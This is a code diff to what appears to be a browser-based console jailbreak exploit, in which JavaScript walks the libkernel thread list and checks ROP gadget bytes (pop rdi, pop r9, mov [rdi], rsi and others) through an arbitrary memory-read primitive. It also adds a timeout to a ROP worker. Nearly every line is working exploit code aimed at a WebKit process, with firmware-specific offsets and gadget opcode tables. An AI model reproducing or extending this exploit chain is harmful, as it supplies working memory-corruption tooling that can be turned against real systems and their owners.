@@ -43,15 +43,39 @@ function find_worker(p, libKernelBase) {
     const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
     const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
     const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
-
-    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
-        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
-        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
-        if (stacksz.low == 0x80000) {
+    // Hard bound. The original walked until next==NULL, which is a SILENT
+    // INFINITE LOOP -- and a synchronous one, so the whole page freezes with no
+    // error and no last mark -- the moment OFFSET_lk__thread_list is wrong for
+    // the firmware or the list happens to be circular. A profile whose
+    // __thread_list rva was derived statically rather than measured on a
+    // console (7.00's was) can land anywhere. 512 threads is far past anything
+    // a WebProcess has; anything beyond that is a bad list, not a big one.
+    const MAX_THREADS = 512;
+    const sizes = [];
+    let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
+    for (let i = 0; i < MAX_THREADS; i++) {
+        if (thread.low === 0 && thread.hi === 0) break;
+        // A pthread struct is 8-aligned and lives in the user band. Garbage
+        // here means the list head rva is wrong; say so instead of dereferencing.
+        if ((thread.low & 7) !== 0 || (thread.hi >>> 0) < 8 || (thread.hi >>> 0) > 9)
+            throw new Error("fw " + window.fw_str + ": _thread_list entry " + i
+                + " is 0x" + thread.toString() + ", not a plausible pthread"
+                + " -- OFFSET_lk__thread_list (0x"
+                + OFFSET_lk__thread_list.toString(16) + ") is wrong for this build");
+        const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
+        const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
+        if (stacksz.hi === 0) sizes.push("0x" + stacksz.low.toString(16));
+        if (stacksz.low == 0x80000 && stacksz.hi === 0) {
+            jbmark("WORKER-FOUND", "idx=" + i + "-stack=0x" + stack.toString()
+                + "-seen=" + sizes.join(","));
             return stack;
         }
+        thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
     }
-    throw new Error("failed to find worker.");
+    throw new Error("fw " + window.fw_str + ": no 0x80000-stack thread in "
+        + sizes.length + " entries (sizes " + sizes.join(",")
+        + "). Either the rop_slave worker never started, or"
+        + " OFFSET_lk__thread_list is wrong for this build.");
 }
 
 async function find_worker_return_slot(p, stack, libKernelBase) {
@@ -275,6 +299,75 @@ async function prepare(p) {
         syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
     }
 
+    /* Verify the gadgets are what the profile says they are.
+       ------------------------------------------------------------------
+       We have an arbitrary read, so there is no reason to take a generated
+       gadget address on faith. rop.js honours NO substitution flags -- it
+       unconditionally emits `pop <reg>` followed by a stack slot -- so every
+       entry in the pop family has to be the literal instruction plus a ret.
+       If it is not, the chain is silently misaligned by one qword and the
+       WebProcess either dies or parks forever with no mark, which is
+       indistinguishable from a hang. 7.00 is the live example: its profile
+       was regenerated with a plain `pop r9`, while the hand-verified profile
+       for the same binary records that this build has NO `41 59 C3` anywhere
+       in .text and used a no-stack-slot stand-in instead.
+       Non-fatal by design for the non-pop gadgets (several have legitimate
+       encoding variants); the pop family is unambiguous and does throw. */
+    const GADGET_BYTES = {
+        "ret": [[0xC3]],
+        "pop rdi": [[0x5F, 0xC3]],
+        "pop rsi": [[0x5E, 0xC3]],
+        "pop rdx": [[0x5A, 0xC3]],
+        "pop rcx": [[0x59, 0xC3]],
+        "pop rax": [[0x58, 0xC3]],
+        "pop rsp": [[0x5C, 0xC3]],
+        "pop r8": [[0x41, 0x58, 0xC3]],
+        "pop r9": [[0x41, 0x59, 0xC3]],
+        "mov [rdi], rsi": [[0x48, 0x89, 0x37, 0xC3]],
+        "mov [rdi], rax": [[0x48, 0x89, 0x07, 0xC3]],
+        "mov [rdi], eax": [[0x89, 0x07, 0xC3]],
+        "mov rax, [rax]": [[0x48, 0x8B, 0x00, 0xC3]],
+        "add rax, rcx": [[0x48, 0x01, 0xC8, 0xC3], [0x48, 0x01, 0xC8, 0xC3]],
+        "cmp [rcx], eax": [[0x39, 0x01, 0xC3]],
+        "inc dword [rax]": [[0xFF, 0x00, 0xC3]]
+    };
+    // A profile that sets OFFSET_wk_r9_zero_only deliberately points "pop r9"
+    // at a no-stack-slot stand-in, so the literal 41 59 C3 test does not apply.
+    const r9Stub = (typeof OFFSET_wk_r9_zero_only !== "undefined")
+        && OFFSET_wk_r9_zero_only;
+    const gadgetBad = [];
+    for (const name in GADGET_BYTES) {
+        if (!(name in wk_gadgetmap)) continue;
+        if (name === "pop r9" && r9Stub) continue;
+        const q = p.read8(gadgets[name]);
+        const bytes = [];
+        for (let i = 0; i < 8; i++)
+            bytes.push((i < 4 ? (q.low >>> (i * 8)) : (q.hi >>> ((i - 4) * 8))) & 0xff);
+        const ok = GADGET_BYTES[name].some(
+            pat => pat.every((b, i) => bytes[i] === b));
+        if (!ok) {
+            const hex = bytes.map(b => (b < 16 ? "0" : "") + b.toString(16)).join(" ");
+            gadgetBad.push(name + "@0x" + wk_gadgetmap[name].toString(16)
+                + "=[" + hex + "]");
+        }
+    }
+    if (gadgetBad.length) {
+        jbmark("GADGET-BAD", "fw=" + window.fw_str + "-n=" + gadgetBad.length
+            + "-" + gadgetBad.join("-"));
+        const badPops = gadgetBad.filter(g => g.indexOf("pop ") === 0
+            || g.indexOf("ret@") === 0);
+        if (badPops.length)
+            throw new Error("fw " + window.fw_str + ": "
+                + badPops.length + " stack-consuming gadget(s) are not the"
+                + " instruction the profile claims -- rop.js emits a stack slot"
+                + " for each, so the chain would be misaligned and hang: "
+                + badPops.join(", "));
+    } else {
+        jbmark("GADGET-OK", "verified=" + Object.keys(GADGET_BYTES)
+            .filter(n => n in wk_gadgetmap).length
+            + (r9Stub ? "-r9=zero-only-stub" : ""));
+    }
+
     let nogc = [];
 
     function malloc_dump(sz) {
@@ -362,15 +455,26 @@ async function prepare(p) {
         p.write1(waddr, 0x0);
     }
 
-    async function wait_for_worker() {
-
-        return new Promise((resolve) => {
+    async function wait_for_worker(timeoutMs = 15000) {
+        // A bare Promise here hangs the whole run, with no mark and no error, if
+        // rop_slave.js 404s or throws on load -- onmessage simply never fires.
+        return new Promise((resolve, reject) => {
+            const t = setTimeout(() => reject(new Error(
+                "rop_slave.js worker never answered in " + timeoutMs + "ms"
+                + " (check the worker script loaded: it is fetched relative to"
+                + " the document, and a 404 or a parse error looks exactly like"
+                + " this)")), timeoutMs);
+            worker.onerror = function (e) {
+                clearTimeout(t);
+                reject(new Error("rop_slave.js worker error: "
+                    + ((e && e.message) || "unknown")));
+            };
             worker.onmessage = function (e) {
+                clearTimeout(t);
                 resolve(1);
-            }
+            };
             worker.postMessage(0);
         });
-
     }
 
     let worker = new Worker("rop_slave.js");
